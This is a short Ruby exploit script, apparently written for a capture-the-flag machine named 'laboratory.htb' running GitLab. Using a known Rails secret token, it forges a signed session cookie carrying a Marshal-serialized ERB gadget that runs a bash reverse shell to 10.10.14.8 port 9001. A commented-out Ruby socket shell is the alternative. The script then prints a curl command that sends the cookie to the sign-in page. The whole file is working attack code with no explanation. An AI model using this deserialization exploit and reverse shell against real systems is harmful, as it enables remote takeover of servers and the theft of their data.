require 'rails/all'
require 'erb'

secret_token = "3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3"

erb = ERB.new("<%= `/bin/bash -c bash -i >& /dev/tcp/10.10.14.8/9001 0>&1` %>")
#erb = ERB.new("<%= `ruby -rsocket -e'f=TCPSocket.open(\"10.10.14.8\",9001).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'` %>")

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)

my_evil_session_hash = {
    "experimentation_subject_id" => Marshal.dump(depr)
}

# Serialize your hash
marshal_dump = Marshal.dump(my_evil_session_hash)

# Base64 encode this dump
unescaped_cookie_value = Base64.encode64(marshal_dump)

# Escape any troublesome characters and remove line breaks altogether
escaped_cookie_value = CGI.escape(unescaped_cookie_value).gsub("%0A", "")

# Calculate the signature using the HMAC digest of the secret_token and the escaped cookie value. Replace %3D with equals signs.
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, escaped_cookie_value.gsub("%3D", "="))

# Construct your evil cookie by concatenating the value with the signature
my_evil_cookie = "#{unescaped_cookie_value}--#{cookie_signature}".delete!("\n")
#puts("GENERATED COOKIE with marshalled reverse shell:\n#{my_evil_cookie}")

puts("COMMAND:\ncurl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b \"experimentation_subject_id=#{my_evil_cookie}\"")
